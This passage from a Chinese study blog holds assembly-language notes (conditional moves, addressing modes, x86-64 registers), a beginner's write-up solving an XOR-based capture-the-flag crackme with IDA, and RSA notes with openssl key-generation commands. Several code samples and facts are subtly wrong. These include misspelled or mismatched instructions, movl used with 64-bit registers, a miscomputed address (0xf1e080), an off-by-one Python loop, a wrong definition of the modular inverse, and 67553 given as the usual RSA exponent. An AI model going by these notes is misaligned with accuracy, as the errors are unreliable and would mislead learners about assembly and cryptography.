123456789101112#编译后的代码int goto_ad(int x,int y)&#123; int result; if(x&lt;=y) goto Else; result = x - y;Exit: renturn result ;Else: result = y - x; goto Exit;&#125; 四、条件移动指令1.C语言：条件表达式 ① 表达式形式： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val = Test ? Then-Expr : Else-Expr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val = x - y ? x - y : y - x;② 条件表达式的执行顺序： 先求解表达式的Test，若非为0（也就是真），则求解表达式Then-Expr，此时表达式Then-Expr的值就作为整个表达式的值； 若Test的值为0（也就是假），则求解表达式Else-Expr，此时表达式Else—Expr的值就作为整个表达式的值； ③ Goto语句版本： 12345678 nt =! Test; if (nt) goto Else; val = Then - Expr;Done: ...Else: val = Expr - Then; goto Done; 2.x86-64下的条件移动指令 ① 实例 12345678910#C代码段int absdiff(int x, int y)&#123; int result; if(x &gt; y) result = x - y; else result = y - x; return result; &#125; 编译生成的汇编代码(x86-64位)：01.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;absdiff: # x in %edi, y in %esi02.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edi,%eax &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# v = x03.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esi,%edx &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ve = y04.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;subl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esi,%eax &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# v -= y05.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;subl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esi,%eax &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ve -= x06.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmpl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esi,%edi &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# x : y07.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmovle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%edx,%eax &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# v = ve if &lt;=08.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret② 条件传送指令：cmovC 命令格式：cmoveC &nbsp;&nbsp;Src,Dest如果条件C成立，将从数据Src传送到Dest。因为其控制流可预测（即条件C是已知的）从执行角度来看，比一般的条件跳转指令的效率高。五、每日一句人生目标确定容易实现难，但如果不去行动，那么连实现的可能也不会有。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reverse：Reverse sign in解题总结]]></title>
    <url>%2F2019%2F04%2F15%2F2019.04.15%EF%BC%8837%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过这几天的“浴血奋战”，终于在今天上午把这道题目解了出来。对我初学者来说，的确是个不小的挑战。那今天就先总结一下整个解题的思路和所用的知识点，内容上可能会出现一些纰漏，我也将会在后期的学习中不断更新和改正，也希望各位大佬们对我所写的内容有所指点。 一、前期准备 汇编语言知识 IDA工具的使用 C语言部分知识二、知识储备 汇编语言关于汇编语言的知识，我目前还在学习，但是已经学习了一部分，能够看懂一些代码和语句，下面我将这些笔记汇总如下：笔记一、笔记二、笔记三、笔记四、笔记五、笔记六、笔记七、笔记八、笔记九 IDA工具的使用 主要说一下关于IDA常用快捷键的使用，以及所对应的功能 F5：将一个函数逆向出来(生成c伪代码)； ALT+T：搜索字符串(文本搜索)； ALT+B：搜索opcode(二进制数据),搜索16进制； 空格键：反汇编窗口切换文本跟图形； F9：动态调试程序(其实IDA主要用作静态分析用的)； G：搜索地址或者符号； X(ctrl+X)：交叉引用,类似于OD中的栈回溯操作； N：重命名； H：10进制和十六进制 进行转换； Tab： 汇编指令与伪代码之间切换； 双击：转到定义处； Shift + F12：字符串窗口，用于字符串搜索； R 字符转换： 95 —-&gt; “_”; A：解释光标的地址为 字符串的首地址； Alt +A ： 设置字符串的实现格式，如果是UTF8格式字符串可以显示； C语言的知识——异或运算 符号：^ 运算法则： 0 ^ 1 = 1; # false XOR true = true; 0 ^ 0 = 0; # false XOR false = false; 1 ^ 1 = 0; # true XOR true = false; 1 ^ 0 = 1; # true XOR false = true; &nbsp;&nbsp;&nbsp;&nbsp;从上面的运算法则可以简单总结：异或运算的两边如果相同，那么结果就是false，如果异或运算的两边不同，那么结果就为true。 利用异或运算性质进行加密如果两个符号：a 和 b，如果a ^ b = c，那么 c ^ b = a;注：这里的运算是根据二进制的来进行运算的三、做题思路 然后在kali系统内查看一下rev1的文件信息，查看该文件是多少位的； 首先打开该文件，看是一个什么文件，并用gdb运行该文件； 查看该文件用了哪些防护技术，再根据采取的防护技术，进行下一步的操作； 用IDA对文件进行反编译，分析程序功能； 根据分析进行相应的操作，找出flag；四、解题过程1. 在Kali系统内查看该文件的信息file rev1从上图可以看到该文件是一个 64 位可执行（executable）文件2. 用gdb执行该文件从上图可以看出，该文件要求输入一个flag，于是我输入了几个随机的字母，出现结果“Wrong”，如下图所示：3. 用 IDA-64bit 打开文件rev1用IDA打开该文件，想看看这个可执行文件的程序，打开以后以后的页面是汇编指令，如下图：4. 对汇编指令进行反编译（F5），并对main函数进行分析反编译之后得到伪C代码： 123456789101112131415161718192021222324252627# main 函数__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 result; // rax@2 __int64 v4; // rdx@7 char s; // [sp+0h] [bp-30h]@1 __int64 v6; // [sp+28h] [bp-8h]@1 v6 = *MK_FP(__FS__, 40LL); printf(&quot;Please input your flag:&quot;, a2, a3); __isoc99_scanf(&quot;%32s&quot;, &amp;s); if ( strlen(&amp;s) == 32 ) &#123; if ( sub_400686(&amp;s) ) puts(&quot;Right!&quot;); else puts(&quot;Wrong!&quot;); result = 0LL; &#125; else &#123; puts(&quot;Wrong!&quot;); result = 0LL; &#125; v4 = *MK_FP(__FS__, 40LL) ^ v6; return result;&#125; ☛ 分析main函数：&nbsp;&nbsp;&nbsp;&nbsp;可以看出变量 s 就是我们要输入的flag。先找怎么让结果输出“Right”，可以看出变量 s 进入一个 if 语句，然后又进入一个函数 “sub_400686(&amp;s)” ，那么有可能是当 s 符合sub_400686(&amp;s)函数的要求，那么就会输出“Right”，那么下一步就让我们来看看sub_400686(&amp;s)函数的功能。 5. 分析 sub_400686(&amp;s)函数12345678910111213# sub_400686(&amp;s)函数signed __int64 __fastcall sub_400686(__int64 a1)&#123; signed int i; // [sp+Ch] [bp-Ch]@1 for ( i = 0; i &lt;= 31; ++i ) &#123; if ( (char)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i ) return 0LL; &#125; return 1LL;&#125; ☛sub_400686(&amp;s) 函数分析：&nbsp;&nbsp;&nbsp;&nbsp;可以看到，该函数主要的功能是 if 语句，表达的意思为：【如果形参 a1( 实参为s )中每个字符 &nbsp;&nbsp;&nbsp;XOR&nbsp;&nbsp;&nbsp; byte_400818[i]中的字符 ! = i 】成立则 return 0，说明要想 return 1，则 (char)(*(_BYTE *)(i + a1) ^ byte_400818[i]) == i。在这里就可以用的上“知识储备”中提到的知识点——利用异或运算性质加密，那么下一步要分析一下byte_400818[i]中的数值是多少。 6. 分析 byte_400818[i]双击 byte_400818[i] ，查看存放的数据（点击H，转化为十进制）：102, 109, 99, 100, 127, 60, 54, 114, 87, 66, 100, 59，123, 82, 124, 60, 102, 84, 96, 96, 39, 74, 73, 127，113, 88, 82, 114, 125, 117, 42, 98, 0&nbsp;&nbsp;&nbsp;&nbsp;在这里有个知识点需要说明：2dup(96) = 96, 96☛ dup指令：&nbsp;&nbsp;&nbsp;&nbsp;dup是数据定义伪指令，它可以按照给定的次数来复制某个（某些）操作数，可以避免多次键入同样一个数据。例如，把6个12h存入字节中，可以用下面两种方法： BUF1 db 12h,12h,12h,12h,12h,12h BUF2 db 6dup(12h) &nbsp;&nbsp;&nbsp;&nbsp;可以看出用dup的方法更简便些。 7. 编写计算flag脚本 写脚本前的思考：(char)(\*(\_BYTE \*)(i + a1) ^ byte\_400818[i]) == i，在知识储备那里说过a ^ b = c，则 a = b ^ c，那么 a1 （实参为 s ）的字符串每个字符(char)(\*(\_BYTE \*)(i + a1) = i ^ byte\_400818[i]) 执行python脚本，输出得到flag： 12345# -*- coding:utf-8 -*- n = [102, 109, 99, 100, 127, 60, 54, 114, 87, 66, 100, 59,123, 82, 124, 60, 102, 84, 96, 96, 39, 74, 73, 127,113, 88, 82, 114, 125, 117, 42, 98, 0]for i in range(0,31): print(chr(n[i] ^ i)), 该脚本补充知识点： python的默认编码文件是用的ASCII码，将文件存成了UTF-8，编译就可以通过。或者或在在py文件开头（必须是第一行）加入 #coding=utf-8或者# -*- coding:utf-8 -*- print输出不换行： 对于python 2，只需在print语句后面加上个逗号 对于python 3，需要写成下列形式print(输出内容 , end = ‘ ‘) python进制转换函数 bin：十进制——&gt;二进制 int：float——&gt;int chr(a)：int——&gt;ASCII码 #a∈[0，255] ard(b)：ASCII码——&gt;int #b只有8位 hex：十进制——&gt;十六进制8. 执行脚本，得到flag执行脚本以后，得到的结果如下图所示：9. 验证flag重新执行rev1可执行文件，将所得的flag输入进去，得到输出“Right”五、学习感悟经过了九九八十一难，在今天上午终于把这道题目做出来了。这道题目的分数虽然不高，但是通过这道题目，给我带来的是全新的知识点，是一个全新的学习过程，刚开始的时候的确是最难的：从一开始什么也看不懂，到现在稍微有点思路，这个过程真的太艰辛了！不过还好没有放弃。虽然今天把这道题目做出来了，但是后面还有更多的困难等着我呢！加油吧！少年！不放弃！六、每日一句一个人的成功不取决于他的智慧，而是毅力。]]></content>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（九）]]></title>
    <url>%2F2019%2F04%2F14%2F2019.04.14%EF%BC%8836%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天还是继续学习了汇编语言的知识点，并结合reverse的题目和《深入理解计算机系统》的题目来学习，感觉对汇编语言的理解开始变得深入。今天主要学习的内容主要有： x86-64下的通用寄存器与汇编指令 条件码 比较指令与测试指令 一、x86-64下的通用寄存器与汇编指令1.x86-32与x86-64的数据类型宽度 2.x86-64的通用寄存器 扩展了现有的，并增加了8个新的 %ebp/%rbp 不再是专用寄存器3.x86-32/64下的swap函数比较123456789101112131415161718192021222324252627282930313233343536#C代码void swap(int *xp，int *yp)&#123; int t0 = *xp; int t1 = *yp; *xp = t1; *yp = t0;&#125;#x86-32汇编代码swap： #Set up pushl %ebp movl %esp,%ebp pushl %ebp #**Body** movl 12(%ebp),%ecx movl 8(%ebp),%edx movl (%ecx),%eax movl (%edx),%ebx movl %eax,(%edx) movl %ebx,(%ecx) #Finish movl -4(%ebp),%ebx movl %ebp,%esp popl %ebp ret #x86-64汇编代码swap: movl (%rdi),%edx movl (%rsi),%eax movl %eax,(%rdi) movl %edx,(%rsi) retq 不同点： x86-32传参默认是通过内存来传参； x86-64使用寄存器来传递参数，当参数少于7个时，参数从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9。当参数为7个以上时，前面 6 个传送方式不变，但后面的依次“从右向左”放入栈中。x86-64 时无栈操作，被操作数据仍为32位，所以使用寄存器%eax、%edx以及movl指令 3.变形：x86-64下long int类型的swap12345678910111213141516#C代码void swap_1(int *xp，int *yp)&#123; long int t0 = *xp; long int t1 = *yp; *xp = t1; *yp = t0;&#125;#x86-64下的汇编代码swap: movl (%rdi),%rdx movl (%rsi),%rax movl %rax,(%rdi) movl %rdx,(%rsi) retq 被操作位的数据是64位，所以使用寄存器%rax、%rdx，以及movq指令（“q”表示“4字”） 4.x86指令的特点 支持多种类型的指令操作数：立即数、寄存器、内存数据 算术/逻辑指令可以以内存数据为操作数 支持多种内存地址计算模式 Rb + S * Ri + D 也可用于整数计算（如：leal指令）5.x86汇编的格式6.练习题 二、条件码 CF（Carry&nbsp;&nbsp;Flag）：进位位 SF（Sign&nbsp;&nbsp;&nbsp;&nbsp;Flag）：符号位 ZF（Zero&nbsp;&nbsp;&nbsp;&nbsp;Flag）：零位 OF（Overflow&nbsp;&nbsp;Flag）：溢出位 ☛ 这些条件码由算术指令隐含设置 addl&nbsp;&nbsp;&nbsp;&nbsp;Src,Dest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addq&nbsp;&nbsp;&nbsp;&nbsp;Src,Dest类似的C语言表达式： t = a + b （a = Src，b = Dest） CF 进位标志：可用于检测无符号整数运算的溢出 ZF set if t == 0 SF set if t &nbsp;&lt; &nbsp;0 OF set if：补码运算溢出（即带符号整数运算）（a &gt; 0 &amp;&amp; b &gt;0 &amp;&amp; t &lt; 0）|| （a &lt; 0 &amp;&amp; b 0） 三、比较指令与测试指令1.比较指令（Compare）指令 cmpl&nbsp;&nbsp;&nbsp;&nbsp;Src2,Src1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmpq&nbsp;&nbsp;&nbsp;&nbsp;Src2,Src1cmpl b,a 类似于计算a - b（但是不改变目的操作数） 可用于无符号数的比较&nbsp;&nbsp;&nbsp;ZF set if a == b&nbsp;&nbsp;&nbsp;SF set if (a &lt; b) &lt; 0&nbsp;&nbsp;&nbsp;OF set if two’s complement overflow (a &gt; 0 &amp;&amp; b &lt; 0 &amp;&amp; (a - b) &lt; 0）|| （a &lt; 0 &amp;&amp; b &gt; 0 &amp;&amp; (a - b) &gt; 0)2.测试指令（Test）testl&nbsp;&nbsp;&nbsp;&nbsp;Src2,Src1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;testq&nbsp;&nbsp;&nbsp;&nbsp;Src2,Src1计算Src1 &amp; Src2并设置相应的条件码，但是不改变目的操作数 ZF set when a&amp;b == 0 SF set when a&amp;b &lt; 0 test 指令使CF、OF为0 四、学习感悟 今天在做逆向的题目，感觉慢慢的对这方面的题目有了自己的理解。在跟着视频学习了一段时间，对我解题时的理解有很大的帮助，我也会坚持学习，直到自己真正理解了逆向的思想和方法。 五、每日一句不要放弃！坚持下去就是胜利！]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crypto：RSA详细总结]]></title>
    <url>%2F2019%2F04%2F13%2F2019.04.13%EF%BC%8835%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识1.互质关系的结论 ① 任意两个质数构成互质关系，比如13和61② 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10③ 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57④ 1和任意一个自然数是都是互质关系，比如1和99⑤ p是大于1的整数，则p和p-1构成互质关系，比如57和56⑥ p是大于1的奇数，则p和p-2构成互质关系，比如17和15 2.欧拉函数 在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。此函数以其首名研究者欧拉命名(Euler’s totient function)，它又称为Euler’s totient function、φ函数、欧拉商数等。 例如φ(8)=4，因为1,3,5,7均和8互质。通式:![](https://gss0.bdstatic.com/-4o3dSag_xI4khGkpoWK1HF6hhy/baike/s%3D146/sign=972114bf49a98226bcc12f23bc80b97a/f3d3572c11dfa9ecf6f6c0dd68d0f703908fc124.jpg)公式推导：① 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。② 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系③ 如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 φ(n) = p^k - p^(k-1)④ 如果n可以分解成两个互质的整数之积，则 φ(n) = φ(p1*p2) = φ(p1)*φ(p2) = (p1 -1) * (p2 -1) 3.欧拉定理在数论中，欧拉定理,（也称费马-欧拉定理）是一个关于同余的性质。欧拉定理表明，若n,a为正整数，且n,a互质，则: 也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104） 4.模反元素如果两个正整数e和φ(n)互质，那么一定可以找到整数d，使得 e*φ(n) -1 被d整除，或者说e*φ(n)被d除的余数是1。这时，d 就叫做φ(n) 的”模反元素” 5..扩展欧几里得算法已知整数a、b，扩展欧几里得算法可以在求得a、b的最大公约数的同时，能找到整数x、y（其中一个很可能是负数），使它们满足贝祖等式：ax + by = gcd(a,b) 二、RSA算法的原理：1.生成密钥对的过程① 随机选取两个大的质数p和q，且p≠q；② 计算模 n，公式为：n = p q，其中n的二进制的位数就是密钥的长度；③ 根据欧拉公式计算φ(n)，公式为：φ(n) = (p-1) (q-1);④ 在1和φ(n)之间选取一个随机整数 e，要求e与φ(n)互质，一般选67553；⑤ 计算e对于φ(n)的模反元素d：e d ≡ 1 (mod φ(n)) 等价于 e d - 1 = k * φ(n)，再通过”扩展欧几里得算法”得出d 和 k⑥ 封装密钥：（n，e）=&gt; 公钥（n，d）=&gt; 私钥 2.加密和解密① 加密：me ≡ c (mod n)② 解密：cd ≡ m (mod n) 三、代码实现1.openssl 语句（非对称加密算法）• 生成私钥：openssl genrsa -out rsa_private_key.pem 1024• 查看私钥：openssl rsa -in rsa_private_key.pem -out rsa_private_key.txt -text• 提取公钥：openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem• 查看公钥：openssl rsa -in rsa_public_key.pem -pubin -out rsa_public_key.text -text• 公钥加密：openssl rsautl -in flag.txt -pubin -inkey rsa_public_key.pem -out flag.pem -encrypt• 私钥解密：openssl rsautl -in flag.pem -inkey rsa_private_key.pem -out flag.txt -decrypt 2.python 语句（非对称加密算法——公钥求私钥）12345678910111213# python 生成的密钥是无填充的，需要在openssl rsautl 命令后添加一个选项 -rawimport mathimport sysfrom Crypto.PublicKey import RSA keypair = RSA.generate(1024) keypair.p = xxxxxxxxxxxx...keypair.q = xxxxxxxxxxxx...keypair.e = xxxxxxxxxxxx...keypair.n = keypair.p * keypair.q keypair.d = xxxxxxxxxxxx... private = open(&apos;private.pem&apos;,&apos;w&apos;)private.write(keypair.exportKey()) 四、所用工具 RSA-Tool（求模反元素） openssl（主要命令） python Linux（系统） yafu（大素数分解）]]></content>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（八）]]></title>
    <url>%2F2019%2F04%2F12%2F2019.04.12%EF%BC%8834%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天开始做Pwn和reverse的题目，在做题时只能用四个字“一头雾水”来形容我。在做这两类题目的时候，让我觉得“汇编语言”重要性，以及一些工具使用的重要性，于是我又接着以前的学习，今天又开始了“汇编语言”的学习： 寻址模式 地址计算指令与其他 #知识储备 ① $立即数，则取得的操作数就是立即数② 立即数，则取得的操作数就是以立即数为地址，对应取出的操作数③ 寄存器，则取得的操作数就是以寄存器的值④ (存器)，则取得的操作数就是以寄存器的值为地址，对应取出的操作数⑤ 通用的公式：立即数1(寄存器1，寄存器2，立即数2)，表示为： (立即数1值+寄存器1值+寄存器2值*立即数2）为地址，对应取出的操作数有了最通用的公式，其他变种都能写出，比如：(,寄存器2，立即数2) 取得的操作数就是： 寄存器2的值*立即数2 为地址，对应取出的操作数 一、寻址模式1、寻址模式示例12345678910111213141516171819202122232425262728#C代码void swap(int *xp，int *yp)&#123; int t0 = *xp; int t1 = *yp; *xp = t1; *yp = t0;&#125;#汇编代码swap： #Set up pushl %ebp movl %esp,%ebp pushl %ebp #**Body** movl 12(%ebp),%ecx movl 8(%ebp),%edx movl (%ecx),%eax movl (%edx),%ebx movl %eax,(%edx) movl %ebx,(%ecx)#Finish movl -4(%ebp),%ebx movl %ebp,%esp popl %ebp ret 2、实例分析 ① 寄存器和变量的关系 %eax =&gt; t1 %ebx =&gt; t0 %ecx =&gt; yp %edx =&gt; xp ② 栈的情况③ 代码分析 movl&nbsp;&nbsp;&nbsp;12(%ebp),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;ecx = yp%ebp默认地址为0x104，偏移量为0。那么12（%ebp）指的是偏移量+12，也就是yp的地址（0x110）；然后把该地址中存放的内容（0x124）给%ecx。此时%ecx里存放的内容为0x120 movl&nbsp;&nbsp;&nbsp;8(%ebp),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;edx = xp8(%ebp)表示，在%ebp的基础上偏移量+8，是xp的地址——0x10c；然后把该地址中存放的内容（0x124）送到%edx中。此时%edx里存放的内容为0x124 movl&nbsp;&nbsp;&nbsp;(%ecx),%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;&nbsp;eax = *yp(t1)表示的意思为将%ecx中的值（0x120）作为地址，再把这个地址中的数据(456)取出来放到%eax中。此时%eax / 0x120 中的内容为456 movl&nbsp;&nbsp;&nbsp;(%edx),%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;&nbsp;ebx = *xp(t0)表示的意思是将%edx中的值（0x124）作为地址，再把这个地址中的数据(123)取出来放到%ebx中。此时%edx / 0x124中的内容为123 movl&nbsp;&nbsp;&nbsp;%eax,(%edx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;&nbsp;*xp = eax表示的意思是将%eax中的数据（456）取出来，放到%edx中的值（0x124）所代表的地址中。此时0x124中的内容为456 movl&nbsp;&nbsp;&nbsp;%ebx,(%ecx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;&nbsp;*yp = ebx表示的意思是将%ebx中的数据（123）取出来，放到%ecx中的值（0x120）。此时0x120中的内容为123 二、地址计算指令与其他1、变址寻址 ① 常见形式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D(Rb,Ri,S)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[D+Reg[Rb]+S*Reg[Ri]]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D：常量（地址偏移量）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rb：基址寄存器（8个通用寄存器之一）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ri：索引寄存器（%esp不做为索引寄存器，%ebp一般也不做为索引寄存器）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S：比例因子（1、2、4 or 8 ）也就是上文所说的通用公式：立即数1(寄存器1，寄存器2，立即数2) = Mem[立即数1值+寄存器1值+寄存器2值*立即数2值]② 其他变形 (Rb,Ri)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[Reg[Rb]+Reg[Ri]] D(Rb,Ri)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[D+Reg[Rb]+Reg[Ri]] (Rb,Ri,S)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[Reg[Rb]+S*Reg[Ri]] ③ 变址寻址实例 %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf000 %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x100 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Expression&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comulation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8(%edx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8 + 0xf000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf008&nbsp;&nbsp;&nbsp;&nbsp;(%edx,%ecx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf000 + 0x100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf100&nbsp;&nbsp;&nbsp;(%edx,%ecx,4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf000 + 4*0x100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf400&nbsp;&nbsp;&nbsp;&nbsp;0x80(,%edx,2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x80 + 2*0xf000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xf1e080 2、地址计算指令 指令语句：leal Src，Dest Src：地址计算表达式（上文的通用公式） 计算出来的地址赋值给Dest 使用实例：用来地址计算，但无需访存Eg：translation of p = &amp;x[i]进行 x + k * y这一类型的整数计算（k = 1，2，4 or 8） leal指令实例123456789&gt;movl 8(%ebp),%eax # eax = x&gt;movl 12(%ebp),%edx # edx = y&gt;leal (%edx,%eax),%ecx # ecx = x + y (t1)&gt;leal (%edx,%edx,2) # edx = 3 * y&gt;sall $4,%edx # edx = 48* y (t4)&gt;addl 16(%ebp),%eax # eax = z + t1 (t2)&gt;leal 4(%edx,%eax),%eax # eax = 4 + t4 +x (t5)&gt;imull %ecx,%eax # eax = t5 *t2 (rval)&gt; 3、整数计算指令1234567891011Format Computation#双操作数指令addl Src,Dest Dest = Dest + Srcsubl Src,Dest Dest = Dest - Srcimull Src.Dest Dest = Dest * Srcsall Src,Dest Dest = Dest &lt;&lt; Src #与shll等价sarl Src,Dest Dest = Dest &gt;&gt; Src #算术右移shrl Src,Dest Dest = Dest &gt;&gt; Src #逻辑右移xorl Src,Dest Dest = Dest ^ Srcandl Src,Dest Dest = Dest &amp; Srcorl Src,Dest Dest = Dest | Src 四、学习感悟 今天在做题时，真的被打击了自信心，关于汇编、反汇编、利用Debug等等真的是太薄弱了，以后还得严格要求自己，努力学习专业知识，做到真懂、真会、真理解。加油吧！！ 五、每日一句 Believe in yourself，learn，and 